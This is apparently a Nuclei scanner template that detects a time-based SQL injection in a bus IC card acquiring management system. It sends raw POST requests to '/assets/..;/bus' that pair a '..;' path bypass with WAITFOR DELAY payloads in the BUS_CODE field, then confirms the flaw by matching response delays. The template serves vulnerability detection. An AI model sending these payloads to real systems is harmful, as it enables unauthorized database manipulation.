id: poc-yaml-bus-ic-card-ams-bus-sqli
info:
  name: 公交IC卡收单管理系统 bus SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 公交IC卡收单管理系统
  description: |
    This template identifies a SQL injection vulnerability in the 公交IC卡收单管理系统 that allows attackers to manipulate database queries.

http:
  - raw:
      - |
        POST /assets/..;/bus HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _search=false&nd=1727248354972&rowCountPerPage=10&pageNo=1&sidx=BUS_CODE&sord=asc&method=select&BUS_CODE=1');WAITFOR DELAY '0:0:5'--
      - |
        POST /assets/..;/bus HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _search=false&nd=1727248354972&rowCountPerPage=10&pageNo=1&sidx=BUS_CODE&sord=asc&method=select&BUS_CODE=1');WAITFOR DELAY '0:0:8'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "window.top.window.jQuery"
          - "(\"#temporary_iframe_id\")"
          - "\"pageCount\":0"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
